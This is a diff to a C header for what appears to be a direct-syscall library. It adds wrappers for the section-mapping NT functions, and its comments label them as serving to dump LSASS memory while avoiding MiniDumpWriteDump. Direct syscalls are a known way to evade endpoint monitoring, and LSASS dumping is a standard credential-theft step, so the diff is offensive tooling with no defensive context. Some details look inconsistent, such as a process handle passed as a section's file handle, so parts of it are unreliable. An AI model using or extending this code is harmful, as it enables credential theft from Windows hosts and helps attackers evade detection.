@@ -59,7 +59,10 @@ typedef enum _SC_ID {
     SSN_NtCreateThreadEx         = 3,
     SSN_NtClose                  = 4,
     SSN_NtReadVirtualMemory      = 5,
-    SC_COUNT                     = 6
+    SSN_NtCreateSection          = 6,   /* for lsass snapshot dump */
+    SSN_NtMapViewOfSection       = 7,   /* for lsass snapshot dump */
+    SSN_NtUnmapViewOfSection     = 8,   /* cleanup after snapshot  */
+    SC_COUNT                     = 9
 } SC_ID;
 
 /* ── Public API ─────────────────────────────────────────────────────────── */
@@ -182,6 +185,74 @@ static inline NTSTATUS
 SC_NtClose(HANDLE Handle)
 {
     return sc_syscall4(sc_get_ssn(SSN_NtClose), Handle, 0, 0, 0);
+}
+
+/*
+ * SC_NtCreateSection
+ * ------------------
+ * Creates a section object backed by a process's virtual address space.
+ * Used by the lsass snapshot dump technique to clone lsass memory without
+ * calling MiniDumpWriteDump.
+ *
+ * Parameters match NtCreateSection exactly:
+ *   SectionHandle         — out: handle to new section
+ *   DesiredAccess         — SECTION_MAP_READ etc.
+ *   ObjectAttributes      — NULL for anonymous section
+ *   MaximumSize           — NULL → section size == file/mapping size
+ *   SectionPageProtection — PAGE_READONLY
+ *   AllocationAttributes  — SEC_COMMIT | SEC_IMAGE_NO_EXECUTE
+ *   FileHandle            — process handle (when SEC_IMAGE_NO_EXECUTE used)
+ */
+/* 7-argument direct syscall helper for NtCreateSection */
+NTSTATUS sc_syscall7(DWORD ssn, ...);
+
+static inline NTSTATUS
+SC_NtCreateSection7(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess,
+                    PVOID ObjectAttributes, PLARGE_INTEGER MaximumSize,
+                    ULONG SectionPageProtection, ULONG AllocationAttributes,
+                    HANDLE FileHandle)
+{
+    return sc_syscall7(sc_get_ssn(SSN_NtCreateSection),
+                       SectionHandle, (PVOID)(ULONG_PTR)DesiredAccess,
+                       ObjectAttributes, MaximumSize,
+                       (PVOID)(ULONG_PTR)SectionPageProtection,
+                       (PVOID)(ULONG_PTR)AllocationAttributes,
+                       FileHandle);
+}
+
+/*
+ * SC_NtMapViewOfSection
+ * ---------------------
+ * Maps a view of the section into the current process.
+ * 10 parameters — uses sc_syscall11 (which slides up to 11 args).
+ */
+static inline NTSTATUS
+SC_NtMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle,
+                      PVOID *BaseAddress, ULONG_PTR ZeroBits,
+                      SIZE_T CommitSize, PLARGE_INTEGER SectionOffset,
+                      PSIZE_T ViewSize, DWORD InheritDisposition,
+                      ULONG AllocationType, ULONG Win32Protect)
+{
+    return sc_syscall11(sc_get_ssn(SSN_NtMapViewOfSection),
+                        SectionHandle, ProcessHandle, BaseAddress,
+                        (PVOID)(ULONG_PTR)ZeroBits,
+                        (PVOID)(ULONG_PTR)CommitSize, SectionOffset, ViewSize,
+                        (PVOID)(ULONG_PTR)InheritDisposition,
+                        (PVOID)(ULONG_PTR)AllocationType,
+                        (PVOID)(ULONG_PTR)Win32Protect,
+                        NULL /* unused 11th arg */);
+}
+
+/*
+ * SC_NtUnmapViewOfSection
+ * -----------------------
+ * Unmaps a previously mapped section view.
+ */
+static inline NTSTATUS
+SC_NtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress)
+{
+    return sc_syscall4(sc_get_ssn(SSN_NtUnmapViewOfSection),
+                       ProcessHandle, BaseAddress, 0, 0);
 }
 
 #ifdef __cplusplus
